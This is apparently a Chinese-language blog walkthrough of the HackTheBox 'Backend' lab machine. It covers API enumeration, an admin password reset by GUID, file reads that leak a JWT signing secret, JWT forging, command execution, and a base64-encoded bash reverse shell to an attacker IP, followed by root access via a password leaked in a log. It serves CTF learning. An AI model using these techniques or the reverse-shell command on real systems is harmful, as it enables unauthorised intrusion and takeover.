+++
title = 'HTB Backend'
date = 2024-04-21T16:25:01+08:00
description = 'HackTheBox Backend Walkthrough'
tags = [
    "Linux",
    "Web",
    "API",
    "Fuzzing",
    "Feroxbuster",
]
categories = [
    "HackTheBox"
]
draft = false

# SEO 相关元数据
keywords = ["HackTheBox", "HTB Backend", "API 渗透测试", "JWT 破解", "FastAPI", "目录扫描", "权限提升", "Linux 渗透", "Web 安全", "CTF"]
summary = "HackTheBox Backend 机器的完整渗透测试过程，包括 FastAPI 接口枚举、JWT 密钥泄露利用、文件读取漏洞、命令执行接口发现和权限提升技巧。详细展示了现代 Web API 安全测试的实战方法。"

# 开放图谱协议 (Open Graph)
[params]
  og_title = "HTB Backend - Iselt Hack Tips"
  og_description = "HackTheBox Backend 机器渗透测试详解，从 API 枚举到权限提升的完整攻击链分析，适合 Web 安全和 CTF 爱好者学习。"
  og_type = "article"
+++


## nmap 枚举

```bash
# 使用 Pwnbox
nmap -p- -sT -T4 10.10.11.161
```

```txt
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

经典端口

## 初探网站

```bash
curl 10.10.11.161
{"msg":"UHC API Version 1.0"}
```

貌似是一个 api 接口

## 初步枚举

使用 `feroxbuster` 扫描网站

```bash
feroxbuster -u http://10.10.11.161 --force-recursion # 强制递归
```

```txt
200      GET        1l        4w       29c http://10.10.11.161/
401      GET        1l        2w       30c http://10.10.11.161/docs
200      GET        1l        1w       20c http://10.10.11.161/api
200      GET        1l        1w       30c http://10.10.11.161/api/v1
307      GET        0l        0w        0c http://10.10.11.161/api/v1/admin => http://10.10.11.161/api/v1/admin/
405      GET        1l        3w       31c http://10.10.11.161/api/v1/admin/file
```

## `/docs` 目录

```bash
curl http://10.10.11.161/docs | jq .
```

```json
{
  "detail": "Not authenticated"
}
```

没有权限

## `/api/` 目录

```bash
curl http://10.10.11.161/api | jq .
```

```json
{
  "endpoints": [
    "v1"
  ]
}
```

## `/api/v1` 目录

```bash
curl http://10.10.11.161/api/v1 | jq .
```

```json
{
  "endpoints": [
    "user",
    "admin"
  ]
}
```

## 进一步枚举

大概率不用扫描别的目录了，先停止上面的扫描。我们扫描这两个端点。**因为 feroxbuster 默认只扫描 `GET` 方法，对于 API 接口，我们使用 `-m GET,POST` 参数，增加对 `POST` 方法的扫描**。

### 枚举 `/user`

```bash
feroxbuster -u http://10.10.11.161/api/v1/user -m GET,POST
```

> 扫描时我们扫出了很多数字目录如 `/user/1123` 但是没有实际内容，因此我们按 `Enter` 进入设置菜单，使用 `n size 4` 屏蔽大小为 4 的目录

```txt
200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/1
422     POST        1l        3w      172c http://10.10.11.161/api/v1/user/login
422     POST        1l        2w       81c http://10.10.11.161/api/v1/user/signup
```

### 枚举 `/admin`

```bash
feroxbuster -u http://10.10.11.161/api/v1/admin -m GET,POST
```

```txt
401     POST        1l        2w       30c http://10.10.11.161/api/v1/admin/file
```

## `/user` 接口

### `/user/1` 接口

访问 `/user/1`

```bash
curl http://10.10.11.161/api/v1/user/1 | jq .
```

```json
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}
```

可以看到一个 `admin` 的账户信息

### `/user/login` 接口

`/user/login` 貌似是一个登录接口，我们用 `POST` 方法尝试访问

```bash
curl -X POST http://10.10.11.161/api/v1/user/login | jq .
```

```json
{
  "detail": [
    {
      "loc": [
        "body",
        "username"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

我们加上 `username` 和 `password` 参数尝试登录

```bash
# Content-Type: application/json
curl -X POST -H "Content-Type: application/json" http://10.10.11.161/api/v1/user/login -d '{"username": "admin", "password": "admin"}' | jq .
```

```json
{
  "detail": [
    {
      "loc": [
        "body",
        "username"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

```bash
# Content-Type: application/x-www-form-urlencoded
curl -X POST http://10.10.11.161/api/v1/user/login -d 'username=admin&password=admin' | jq .
```

```json
{
  "detail": "Incorrect username or password"
}
```

这里尝试了两种格式（Content-Type）的参数，一种是 `json` 格式，一种是 `x-www-form-urlencoded` 格式，发现服务器接受的是后者。

### `/user/signup` 接口

`/user/signup` 貌似是一个注册接口，我们用 `POST` 方法尝试访问

```bash
curl -X POST http://10.10.11.161/api/v1/user/signup | jq .
```

```json
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

我们尝试传递一些随机参数

```bash
curl -X POST http://10.10.11.161/api/v1/user/signup -d '281d1282=5ebbf69eeefa' | jq .
```

```json
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "value is not a valid dict",
      "type": "type_error.dict"
    }
  ]
}
```

发现要求传递一个字典格式的参数，我们尝试传递 json 数据

```bash
curl -X POST -H "Content-Type: application/json" http://10.10.11.161/api/v1/user/signup -d '{"281d1282": "5ebbf69eeefa"}' | jq .
```

```json
{
  "detail": [
    {
      "loc": [
        "body",
        "email"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

我们尝试传递 `email` 和 `password` 参数

```bash
curl -X POST -H "Content-Type: application/json" http://10.10.11.161/api/v1/user/signup -d '{"email": "test@test.com", "password": "test"}' | jq .
```

```json
{}
```

疑似注册成功，我们尝试使用 `/user/login` 接口登录

```bash
curl -X POST http://10.10.11.161/api/v1/user/login -d 'username=test@test.com&password=test' | jq .
```

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzE0Mzk1OTg4LCJpYXQiOjE3MTM3MDQ3ODgsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiMzFkZDE5MjMtMWNkZC00OTVmLWExODAtMzk3MjYwOWZkNWVmIn0.OMY2TmjaEA7-RK64_WVuQNlWawx4tqibCT7ECUBNs1A",
  "token_type": "bearer"
}
```

发现登录成功，返回了一个 `access_token`

## `/docs` 接口

我们尝试使用 `access_token` 访问 `/docs` 接口

使用浏览器插件 `Modify Header` 添加 `Authorization` 头

![20240421171136](https://cfproxy.iselt.top/https://raw.githubusercontent.com/iselt/ImageBed/main/20240421171136.png)

即可访问 `/docs` 接口，返回了 `FastAPI` 的文档

![20240421174846](https://cfproxy.iselt.top/https://raw.githubusercontent.com/iselt/ImageBed/main/20240421174846.png)

通过 `/api/v1/user/SecretFlagEndpoint` 我们获取到了 user 的 flag

```bash
curl -X 'PUT' \
  'http://10.10.11.161/api/v1/user/SecretFlagEndpoint' \
  -H 'accept: application/json'
```

```json
{
  "user.txt": "b1fce8ddfd7484230cf12db4b10faf00"
}
```

我们也发现了一个 `POST /api/v1/user/updatepass` 的接口，需要 `guid`，我们可以通过 `/user/1` 获取到 `admin` 的 `guid`，测试一下能不能更改 admin 的密码

```bash
curl -X 'POST' \
  'http://10.10.11.161/api/v1/user/updatepass' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "password": "123456"
}'
```

```json
{
  "date": null,
  "id": 1,
  "is_superuser": true,
  "hashed_password": "$2b$12$UdKTFBukB1Qctts8CPLESuIE8sOdJg/rHd87.jaMgFctMCTitsxya",
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "time_created": 1649533388111,
  "last_update": null
}
```

发现密码已经更改成功

我们调用 `/user/login` 接口，获取 `admin` 的 `JWT`

```bash
curl -X 'POST' \
  'http://10.10.11.161/api/v1/user/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'grant_type=&username=admin%40htb.local&password=123456&scope=&client_id=&client_secret='
```

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzE0Mzk4NzM0LCJpYXQiOjE3MTM3MDc1MzQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ._AtjVo_lHDfaLCF4shtgDCXcUmcdx5zkeCHmypnXVps",
  "token_type": "bearer"
}
```

修改 `Modify Header` 插件的 `Authorization` 头为 `admin` 账号的 `JWT`

## `/admin/file` 接口

发现了一个 `POST /api/v1/admin/file` 的接口，我们尝试读取文件

```bash
curl -X 'POST' \
'http://10.10.11.161/api/v1/admin/file' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzE0Mzk3MjkyLCJpYXQiOjE3MTM3MDYwOTIsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.Xq2STmqVRb6y_HYpyDpkqprpQ6wvuSZ1KF7-QETRsu0' \
  -H 'Content-Type: application/json' \
  -d '{
  "file": "/etc/passwd"
}'
```

```json
{
  "file": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\n"
}
```

发现是一个能读取文件的接口

## `/api/v1/admin/exec/{command}` 接口

尝试执行 `id` 命令

```bash
curl -X 'GET' \
  'http://10.10.11.161/api/v1/admin/exec/id' \
  -H 'accept: application/json'
```

```json
{
  "detail": "Debug key missing from JWT"
}
```

疑似需要在 `JWT` 中有 `Debug` 字段

而修改 `JWT` 的内容需要获得 `JWT` 的签名密钥

## 利用 `/admin/file` 接口

读取当前进程环境变量信息

```bash
...
  -d '{"file": "/proc/self/environ"}'
...
```

```json
{
  "file": "APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc\u0000LOGNAME=htb\u0000PORT=80\u0000HOME=/home/htb\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/home/htb/uhc/.venv\u0000INVOCATION_ID=140ea6d97fd3499e966c7281c8b283b2\u0000HOST=0.0.0.0\u0000USER=htb\u0000SHLVL=0\u0000PS1=(.venv) \u0000JOURNAL_STREAM=9:17837\u0000PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000OLDPWD=/\u0000"
}
```

可知当前运行目录是 `/home/htb/uhc`

尝试读取可能的 python 文件，发现 `app` 目录下有 `main.py`

```bash
...
  -d '{"file": "/home/htb/uhc/app/main.py"}'
...
```

```json
{
  "file": "import asyncio\n\nfrom fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends\nfrom fastapi_contrib.common.responses import UJSONResponse\nfrom fastapi import FastAPI, Depends, HTTPException, status\nfrom fastapi.security import HTTPBasic, HTTPBasicCredentials\nfrom fastapi.openapi.docs import get_swagger_ui_html\nfrom fastapi.openapi.utils import get_openapi\n\n\n\nfrom typing import Optional, Any\nfrom pathlib import Path\nfrom sqlalchemy.orm import Session\n\n\n\nfrom app.schemas.user import User\nfrom app.api.v1.api import api_router\nfrom app.core.config import settings\n\nfrom app import deps\nfrom app import crud\n\n\napp = FastAPI(title=\"UHC API Quals\", openapi_url=None, docs_url=None, redoc_url=None)\nroot_router = APIRouter(default_response_class=UJSONResponse)\n\n\n@app.get(\"/\", status_code=200)\ndef root():\n    \"\"\"\n    Root GET\n    \"\"\"\n    return {\"msg\": \"UHC API Version 1.0\"}\n\n\n@app.get(\"/api\", status_code=200)\ndef list_versions():\n    \"\"\"\n    Versions\n    \"\"\"\n    return {\"endpoints\":[\"v1\"]}\n\n\n@app.get(\"/api/v1\", status_code=200)\ndef list_endpoints_v1():\n    \"\"\"\n    Version 1 Endpoints\n    \"\"\"\n    return {\"endpoints\":[\"user\", \"admin\"]}\n\n\n@app.get(\"/docs\")\nasync def get_documentation(\n    current_user: User = Depends(deps.parse_token)\n    ):\n    return get_swagger_ui_html(openapi_url=\"/openapi.json\", title=\"docs\")\n\n@app.get(\"/openapi.json\")\nasync def openapi(\n    current_user: User = Depends(deps.parse_token)\n):\n    return get_openapi(title = \"FastAPI\", version=\"0.1.0\", routes=app.routes)\n\napp.include_router(api_router, prefix=settings.API_V1_STR)\napp.include_router(root_router)\n\ndef start():\n    import uvicorn\n\n    uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\")\n\nif __name__ == \"__main__\":\n    # Use this for debugging purposes only\n    import uvicorn\n\n    uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\")\n"
}
```

格式化后的代码

```python
...
from app.schemas.user import User
from app.api.v1.api import api_router
from app.core.config import settings
...
```

再通过 `import` 语句得到其他 python 代码，重点在 `app/core/config.py` 中

```python
...
JWT_SECRET: str = "SuperSecretSigningKey-HTB"
...
```

使用 `jwt.io` 修改 `JWT`

![20240421175753](https://cfproxy.iselt.top/https://raw.githubusercontent.com/iselt/ImageBed/main/20240421175753.png)

## 取得立足点

使用新的 `JWT` 访问 `/docs`，尝试调用 `/admin/exec/{command}` 接口

```bash
curl -X 'GET' \
  'http://10.10.11.161/api/v1/admin/exec/id' \
    -H 'Authorization: Bearer ...
    ...
```

```json
"uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)"
```

成功执行 `id` 命令，下一步我们尝试反弹 shell

这里由于涉及 url 编码问题，我们使用 base64 编码的方式传递命令

```bash
echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzQ0NDQgMD4mMSI= | base64 -d |bash
```

```bash
htb@backend:~/uhc$ whoami
htb
htb@backend:~/uhc$ pwd
/home/htb/uhc
htb@backend:~/uhc$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

这里可以优化一下反向 shell，为其添加 TTY，可以参考 [为 Reverse Shell 添加 TTY](https://blog.iselt.top/post/tty-shell/)

## 提权

先信息收集一波，看看文件

发现了一个 `auth.log`

```bash
htb@backend:~/uhc$ cat auth.log
04/21/2024, 10:42:25 - Login Success for admin@htb.local
04/21/2024, 10:45:45 - Login Success for admin@htb.local
04/21/2024, 10:59:05 - Login Success for admin@htb.local
04/21/2024, 11:02:25 - Login Success for admin@htb.local
04/21/2024, 11:07:25 - Login Success for admin@htb.local
04/21/2024, 11:10:45 - Login Success for admin@htb.local
04/21/2024, 11:24:05 - Login Success for admin@htb.local
04/21/2024, 11:32:25 - Login Success for admin@htb.local
04/21/2024, 11:34:05 - Login Success for admin@htb.local
04/21/2024, 11:40:45 - Login Success for admin@htb.local
04/21/2024, 11:49:05 - Login Failure for Tr0ub4dor&3
04/21/2024, 11:50:40 - Login Success for admin@htb.local
04/21/2024, 11:50:45 - Login Success for admin@htb.local
04/21/2024, 11:51:05 - Login Success for admin@htb.local
04/21/2024, 11:52:25 - Login Success for admin@htb.local
04/21/2024, 11:57:25 - Login Success for admin@htb.local
04/21/2024, 12:04:05 - Login Success for admin@htb.local
04/21/2024, 12:53:33 - Login Failure for admin
04/21/2024, 13:06:28 - Login Success for test@test.com
04/21/2024, 13:28:12 - Login Success for admin@htb.local
04/21/2024, 13:51:32 - Login Success for admin@htb.local
04/21/2024, 13:52:14 - Login Success for admin@htb.local
```

其中有一个 `Login Failure for Tr0ub4dor&3` 的记录，这里本该是用户名，但却出现了疑似密码的字符串，我们尝试使用这个字符串进行提权

```bash
htb@backend:~/uhc$ su -
Password:Tr0ub4dor&3
root@backend:~# cat ~/root.txt
...
```

成功提权
